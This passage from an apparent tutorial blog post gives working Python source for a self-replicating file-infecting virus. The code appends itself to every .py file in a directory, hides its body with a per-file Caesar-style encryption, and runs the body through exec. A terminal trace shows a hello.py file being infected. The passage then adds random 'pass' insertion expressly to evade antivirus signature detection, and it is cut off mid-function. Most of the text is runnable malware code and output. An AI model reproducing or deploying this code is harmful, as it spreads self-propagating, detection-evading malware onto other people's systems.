+it contains the string &ldquo;del calcula_clave&rdquo;, if it does not have it, the following actions will be done:
+<ul>
+<li>The functions &ldquo;encrypt&rdquo;, &ldquo;infect&rdquo;, &ldquo;payload&rdquo; and &ldquo;run&rdquo; will be encrypted.</li>
+<li>The calculate_key and decrypt functions will be added to the file to be infected.</li>
+<li>A code will be created to decrypt the encrypted text.</li>
+<li>The encrypted code and the code to decrypt it will be added at the end of the file to be infected.</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">infect</span>(virus):
+    <span style="color:#f92672">import</span> os
+    <span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>listdir(<span style="color:#e6db74">&#34;.&#34;</span>):
+        <span style="color:#66d9ef">if</span> file<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#34;.py&#34;</span>):
+            script <span style="color:#f92672">=</span> open(file, <span style="color:#e6db74">&#34;r+&#34;</span>)
+            text_script <span style="color:#f92672">=</span> script<span style="color:#f92672">.</span>read()
+            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;def calculate_key&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> text_script:
+                plain_part <span style="color:#f92672">=</span> virus[:<span style="color:#ae81ff">517</span>]
+                part_to_encrypt <span style="color:#f92672">=</span> virus[<span style="color:#ae81ff">517</span>:]
+                key <span style="color:#f92672">=</span> calculate_key(text_script)
+                encrypted_part <span style="color:#f92672">=</span> encrypt(part_to_encrypt, key)
+                script<span style="color:#f92672">.</span>write(plain_part)
+                decrypter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;import sys&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;host = open(sys.argv[0], &#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;r&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;host_text = host.read()&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;host.close()&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;plain_part = host_text[host_text.find(&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;def calculate_key&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;):host_text.find(&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;def calculate_key&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;)+517]&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;key = calculate_key(host_text)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;decrypted_text = decrypt(&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> encrypted_part <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;, key)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;exec(decrypted_text)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;run(plain_part + decrypted_text)&#34;</span>
+                script<span style="color:#f92672">.</span>write(decrypter)
+            script<span style="color:#f92672">.</span>close()
+</code></pre></div><ul>
+<li><strong>decrypter</strong> variable code: this is the code used to decrypt the encrypted contents of the virus after the first 
+infection.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys
+host <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#34;r&#34;</span>)
+host_text <span style="color:#f92672">=</span> host<span style="color:#f92672">.</span>read()
+host<span style="color:#f92672">.</span>close()
+plain_part <span style="color:#f92672">=</span> host_text[host_text<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;def calculate_key&#34;</span>):host_text<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;def calculate_key&#34;</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">517</span>]
+key <span style="color:#f92672">=</span> calculate_key(host_text)
+decrypted_text <span style="color:#f92672">=</span> decrypt(<span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">wxy xgvkrim(mxqm, dxr):
+</span><span style="color:#e6db74">    xgvkrimxw_mxqm = &#34;&#34;
+</span><span style="color:#e6db74">    yhk vatktvmxk bg mxqm:
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">***
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">wxy kng(obknl):
+</span><span style="color:#e6db74">    bgyxvm(obknl)
+</span><span style="color:#e6db74">    itrehtw()&#34;&#34;&#34;</span>, key)
+<span style="color:#66d9ef">exec</span>(decrypted_text)
+run(plain_part <span style="color:#f92672">+</span> decrypted_text)
+</code></pre></div><ul>
+<li><strong>payload</strong> function: this function would contain the malicious code. In this case, only the message &ldquo;You were 
+infected&rdquo; is printed on the screen.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">payload</span>():
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;You were infected&#34;</span>)
+</code></pre></div><ul>
+<li><strong>run</strong> function: this function calls the infect and payload functions.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run</span>(virus):
+    infect(virus)
+    payload()
+</code></pre></div><ul>
+<li><strong>Global code</strong>: This code reads the germ code, stays with the rest with the functions explained above, and runs the 
+virus.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys
+host <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#34;r&#34;</span>)
+host_text <span style="color:#f92672">=</span> host<span style="color:#f92672">.</span>read()
+host<span style="color:#f92672">.</span>close()
+virus <span style="color:#f92672">=</span> host_text[:<span style="color:#ae81ff">2126</span>]
+run(virus)
+</code></pre></div><p>After explaining all the functions, the complete germ code is as follows:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calculate_key</span>(text):
+    <span style="color:#66d9ef">if</span> len(text) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">3</span>:
+        key <span style="color:#f92672">=</span> ord(text[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> ord(text[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">+</span> ord(text[<span style="color:#ae81ff">2</span>])
+    <span style="color:#66d9ef">else</span>:
+        key <span style="color:#f92672">=</span> <span style="color:#ae81ff">42</span>
+    <span style="color:#66d9ef">return</span> key
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(text, key):
+    decrypted_text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> character <span style="color:#f92672">in</span> text:
+        <span style="color:#66d9ef">if</span> character<span style="color:#f92672">.</span>isupper():
+            decrypted_text <span style="color:#f92672">+=</span> chr((ord(character) <span style="color:#f92672">-</span> key <span style="color:#f92672">-</span> <span style="color:#ae81ff">65</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">65</span>)
+        <span style="color:#66d9ef">elif</span> character<span style="color:#f92672">.</span>islower():
+            decrypted_text <span style="color:#f92672">+=</span> chr((ord(character) <span style="color:#f92672">-</span> key <span style="color:#f92672">-</span> <span style="color:#ae81ff">97</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">97</span>)
+        <span style="color:#66d9ef">else</span>:
+            decrypted_text <span style="color:#f92672">+=</span> character
+    <span style="color:#66d9ef">return</span> decrypted_text
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(text, key):
+    encrypted_text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> character <span style="color:#f92672">in</span> text:
+        <span style="color:#66d9ef">if</span> character<span style="color:#f92672">.</span>isupper():
+            encrypted_text <span style="color:#f92672">+=</span> chr((ord(character) <span style="color:#f92672">+</span> key <span style="color:#f92672">-</span> <span style="color:#ae81ff">65</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">65</span>)
+        <span style="color:#66d9ef">elif</span> character<span style="color:#f92672">.</span>islower():
+            encrypted_text <span style="color:#f92672">+=</span> chr((ord(character) <span style="color:#f92672">+</span> key <span style="color:#f92672">-</span> <span style="color:#ae81ff">97</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">97</span>)
+        <span style="color:#66d9ef">else</span>:
+            encrypted_text <span style="color:#f92672">+=</span> character
+    <span style="color:#66d9ef">return</span> encrypted_text
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">infect</span>(virus):
+    <span style="color:#f92672">import</span> os
+    <span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>listdir(<span style="color:#e6db74">&#34;.&#34;</span>):
+        <span style="color:#66d9ef">if</span> file<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#34;.py&#34;</span>):
+            script <span style="color:#f92672">=</span> open(file, <span style="color:#e6db74">&#34;r+&#34;</span>)
+            text_script <span style="color:#f92672">=</span> script<span style="color:#f92672">.</span>read()
+            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;def calculate_key&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> text_script:
+                plain_part <span style="color:#f92672">=</span> virus[:<span style="color:#ae81ff">517</span>]
+                part_to_encrypt <span style="color:#f92672">=</span> virus[<span style="color:#ae81ff">517</span>:]
+                key <span style="color:#f92672">=</span> calculate_key(text_script)
+                encrypted_part <span style="color:#f92672">=</span> encrypt(part_to_encrypt, key)
+                script<span style="color:#f92672">.</span>write(plain_part)
+                decrypter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;import sys&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;host = open(sys.argv[0], &#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;r&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;host_text = host.read()&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;host.close()&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;plain_part = host_text[host_text.find(&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;def calculate_key&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;):host_text.find(&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;def calculate_key&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;)+517]&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;key = calculate_key(host_text)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;decrypted_text = decrypt(&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> encrypted_part <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">34</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;, key)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;exec(decrypted_text)&#34;</span> <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;run(plain_part + decrypted_text)&#34;</span>
+                script<span style="color:#f92672">.</span>write(decrypter)
+            script<span style="color:#f92672">.</span>close()
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">payload</span>():
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;You were infected&#34;</span>)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run</span>(virus):
+    infect(virus)
+    payload()
+
+
+<span style="color:#f92672">import</span> sys
+host <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#34;r&#34;</span>)
+host_text <span style="color:#f92672">=</span> host<span style="color:#f92672">.</span>read()
+host<span style="color:#f92672">.</span>close()
+virus <span style="color:#f92672">=</span> host_text[:<span style="color:#ae81ff">2126</span>]
+run(virus)
+</code></pre></div><p>If we run this code in a folder where there is another file whose extension is .py we will get the following trace:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">probasvx@probasvx:~/virus2$ ls -las
+total <span style="color:#ae81ff">16</span>
+<span style="color:#ae81ff">4</span> drwxr-xr-x  <span style="color:#ae81ff">2</span> probasvx probasvx <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">13</span> 13:49 .
+<span style="color:#ae81ff">4</span> drwxr-xr-x <span style="color:#ae81ff">22</span> probasvx probasvx <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">13</span> 12:11 ..
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx   <span style="color:#ae81ff">22</span> Dec <span style="color:#ae81ff">13</span> 13:49 hello.py
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx <span style="color:#ae81ff">2243</span> Dec <span style="color:#ae81ff">13</span> 13:06 virus.py
+probasvx@probasvx:~/virus2$ cat hello.py 
+print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Hello world!&#34;</span><span style="color:#f92672">)</span>
+probasvx@probasvx:~/virus2$ python3 virus.py 
+You were infected
+probasvx@probasvx:~/virus2$ ls -las
+total <span style="color:#ae81ff">16</span>
+<span style="color:#ae81ff">4</span> drwxr-xr-x  <span style="color:#ae81ff">2</span> probasvx probasvx <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">13</span> 13:49 .
+<span style="color:#ae81ff">4</span> drwxr-xr-x <span style="color:#ae81ff">22</span> probasvx probasvx <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">13</span> 12:11 ..
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx <span style="color:#ae81ff">2448</span> Dec <span style="color:#ae81ff">13</span> 13:49 hello.py
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx <span style="color:#ae81ff">2243</span> Dec <span style="color:#ae81ff">13</span> 13:06 virus.py
+</code></pre></div><p>In this trace you can see that the file hello.py has increased in size. The content it contains after running the virus 
+is as follows:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Hello world!&#34;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calculate_key</span>(text):
+    <span style="color:#66d9ef">if</span> len(text) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">3</span>:
+        key <span style="color:#f92672">=</span> ord(text[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> ord(text[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">+</span> ord(text[<span style="color:#ae81ff">2</span>])
+    <span style="color:#66d9ef">else</span>:
+        key <span style="color:#f92672">=</span> <span style="color:#ae81ff">42</span>
+    <span style="color:#66d9ef">return</span> key
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(text, key):
+    decrypted_text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> character <span style="color:#f92672">in</span> text:
+        <span style="color:#66d9ef">if</span> character<span style="color:#f92672">.</span>isupper():
+            decrypted_text <span style="color:#f92672">+=</span> chr((ord(character) <span style="color:#f92672">-</span> key <span style="color:#f92672">-</span> <span style="color:#ae81ff">65</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">65</span>)
+        <span style="color:#66d9ef">elif</span> character<span style="color:#f92672">.</span>islower():
+            decrypted_text <span style="color:#f92672">+=</span> chr((ord(character) <span style="color:#f92672">-</span> key <span style="color:#f92672">-</span> <span style="color:#ae81ff">97</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">97</span>)
+        <span style="color:#66d9ef">else</span>:
+            decrypted_text <span style="color:#f92672">+=</span> character
+    <span style="color:#66d9ef">return</span> decrypted_text
+
+<span style="color:#f92672">import</span> sys
+host <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#34;r&#34;</span>)
+host_text <span style="color:#f92672">=</span> host<span style="color:#f92672">.</span>read()
+host<span style="color:#f92672">.</span>close()
+plain_part <span style="color:#f92672">=</span> host_text[host_text<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;def calculate_key&#34;</span>):host_text<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;def calculate_key&#34;</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">517</span>]
+key <span style="color:#f92672">=</span> calculate_key(host_text)
+decrypted_text <span style="color:#f92672">=</span> decrypt(<span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">wxy xgvkrim(mxqm, dxr):
+</span><span style="color:#e6db74">    xgvkrimxw_mxqm = &#34;&#34;
+</span><span style="color:#e6db74">    yhk vatktvmxk bg mxqm:
+</span><span style="color:#e6db74">        by vatktvmxk.blniixk():
+</span><span style="color:#e6db74">            xgvkrimxw_mxqm += vak((hkw(vatktvmxk) + dxr - 65) % 26 + 65)
+</span><span style="color:#e6db74">        xeby vatktvmxk.blehpxk():
+</span><span style="color:#e6db74">            xgvkrimxw_mxqm += vak((hkw(vatktvmxk) + dxr - 97) % 26 + 97)
+</span><span style="color:#e6db74">        xelx:
+</span><span style="color:#e6db74">            xgvkrimxw_mxqm += vatktvmxk
+</span><span style="color:#e6db74">    kxmnkg xgvkrimxw_mxqm
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">wxy bgyxvm(obknl):
+</span><span style="color:#e6db74">    bfihkm hl
+</span><span style="color:#e6db74">    yhk ybex bg hl.eblmwbk(&#34;.&#34;):
+</span><span style="color:#e6db74">        by ybex.xgwlpbma(&#34;.ir&#34;):
+</span><span style="color:#e6db74">            lvkbim = hixg(ybex, &#34;k+&#34;)
+</span><span style="color:#e6db74">            mxqm_lvkbim = lvkbim.kxtw()
+</span><span style="color:#e6db74">            by &#34;wxy vtevnetmx_dxr&#34; ghm bg mxqm_lvkbim:
+</span><span style="color:#e6db74">                ietbg_itkm = obknl[:517]
+</span><span style="color:#e6db74">                itkm_mh_xgvkrim = obknl[517:]
+</span><span style="color:#e6db74">                dxr = vtevnetmx_dxr(mxqm_lvkbim)
+</span><span style="color:#e6db74">                xgvkrimxw_itkm = xgvkrim(itkm_mh_xgvkrim, dxr)
+</span><span style="color:#e6db74">                lvkbim.pkbmx(ietbg_itkm)
+</span><span style="color:#e6db74">                wxvkrimxk = &#34;bfihkm lrl&#34; + vak(10) + &#34;ahlm = hixg(lrl.tkzo[0], &#34; + vak(34) + &#34;k&#34; + vak(34) + &#34;)&#34; + vak(10) + &#34;ahlm_mxqm = ahlm.kxtw()&#34; + vak(10) + &#34;ahlm.vehlx()&#34; + vak(10) + &#34;ietbg_itkm = ahlm_mxqm[ahlm_mxqm.ybgw(&#34; + vak(34) + &#34;wxy vtevnetmx_dxr&#34; + vak(34) + &#34;):ahlm_mxqm.ybgw(&#34; + vak(34) + &#34;wxy vtevnetmx_dxr&#34; + vak(34) + &#34;)+517]&#34; + vak(10) + &#34;dxr = vtevnetmx_dxr(ahlm_mxqm)&#34; + vak(10) + &#34;wxvkrimxw_mxqm = wxvkrim(&#34; + vak(34) + vak(34) + vak(34) + xgvkrimxw_itkm + vak(34) + vak(34) + vak(34) + &#34;, dxr)&#34; + vak(10) + &#34;xqxv(wxvkrimxw_mxqm)&#34; + vak(10) + &#34;kng(ietbg_itkm + wxvkrimxw_mxqm)&#34;
+</span><span style="color:#e6db74">                lvkbim.pkbmx(wxvkrimxk)
+</span><span style="color:#e6db74">            lvkbim.vehlx()
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">wxy itrehtw():
+</span><span style="color:#e6db74">    ikbgm(&#34;Rhn pxkx bgyxvmxw&#34;)
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">wxy kng(obknl):
+</span><span style="color:#e6db74">    bgyxvm(obknl)
+</span><span style="color:#e6db74">    itrehtw()&#34;&#34;&#34;</span>, key)
+<span style="color:#66d9ef">exec</span>(decrypted_text)
+run(plain_part <span style="color:#f92672">+</span> decrypted_text)
+</code></pre></div><p>The following parts can be seen in the infected file:</p>
+<ul>
+<li>The code of the previous program (the &ldquo;Hello world!&quot;).</li>
+<li>The functions for key calculation and decryption.</li>
+<li>The encrypted code along with the calls the key calculation and decryption functions.</li>
+<li>Call the exec function for Python to interpret the decrypted code.</li>
+</ul>
+<p>After all the changes made to the initial virus there is still a weakness, this virus can be detected by the decryption 
+and key calculation functions, as these can be used as a signature for virus detection.</p>
+<p>It should be noted that this virus infects files that do not contain the string &ldquo;def calculate_key&rdquo;, so if a legitimate 
+string exists in a program or script, it will not be infected.</p>
+<h2 id="avoiding-signature-detection">Avoiding signature detection</h2>
+<p>In this new version, the functionality of modifying the code of non-encrypted functions (calculate_key and decrypt) 
+will be added by adding the reserved word &ldquo;pass&rdquo; several times at random in this code. It must be said that the 
+reserved word &ldquo;pass&rdquo; has no effect on the functionality of the functions. Each time the virus runs, the new infected 
+files may have the &ldquo;pass&rdquo; in different positions. This modification is intended not to use code that is not encrypted 
+as a signature of the virus.</p>
+<p>To achieve the functionality described, the following functions have been added and modified:</p>
+<ul>
+<li><strong>delete_pass</strong> function: this function clears all occurrences of the reserved word &ldquo;pass&rdquo; in unencrypted code.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete_pass</span>(code):
+    code_without_pass <span style="color:#f92672">=</span> []
+    <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> code<span style="color:#f92672">.</span>split(chr(<span style="color:#ae81ff">10</span>)):
+        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">&#34;pass&#34;</span> <span style="color:#f92672">in</span> line:
+            code_without_pass<span style="color:#f92672">.</span>append(line)
+    <span style="color:#66d9ef">return</span> chr(<span style="color:#ae81ff">10</span>)<span style="color:#f92672">.</span>join(code_without_pass)
+</code></pre></div><ul>
+<li><strong>calculate_tabulation</strong> function: this function calculates the number of spaces preceding a “pass” when is inserted.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calculate_tabulation</span>(code, position):
+    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;else&#34;</span> <span style="color:#f92672">in</span> code[position] <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;elif&#34;</span> <span style="color:#f92672">in</span> code[position]:
+        <span style="color:#66d9ef">return</span> len(code[position]) <span style="color:#f92672">-</span> len(code[position]<span style="color:#f92672">.</span>lstrip()) <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+    <span style="color:#66d9ef">return</span> len(code[position]) <span style="color:#f92672">-</span> len(code[position]<span style="color:#f92672">.</span>lstrip())
+</code></pre></div><ul>
+<li><strong>add_pass</strong> function: this function is the one that randomly places the &ldquo;pass&rdquo; in the unencrypted code.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_pass</span>(code):
+    <span style="color:#f92672">import</span> random
+    lines <span style="color:#f92672">=</span> code<span style="color:#f92672">.</span>split(chr(<span style="color:#ae81ff">10</span>))
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
+        <span style="color:#66d9ef">if</span> random<span style="color:#f92672">.</span>random() <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0.75</span>:
+            insertion_position <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>, len(lines) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
+            lines<span style="color:#f92672">.</span>insert(insertion_position, <span style="color:#e6db74">&#34; &#34;</span> <span style="color:#f92672">*</span> calculate_tabulation(lines, insertion_position) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;pass&#34;</span>)
+    <span style="color:#66d9ef">return</span> chr(<span style="color:#ae81ff">10</span>)<span style="color:#f92672">.</span>join(lines)
+</code></pre></div><ul>
+<li><strong>modify</strong> function: this function is responsible for deleting previous &ldquo;passes&rdquo; and adding new ones to each of the 
+unencrypted functions.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">modify</span>(code):
+    new_code <span style="color:#f92672">=</span> []
+    separator <span style="color:#f92672">=</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">10</span>)
+    functions <span style="color:#f92672">=</span> code<span style="color:#f92672">.</span>split(separator)
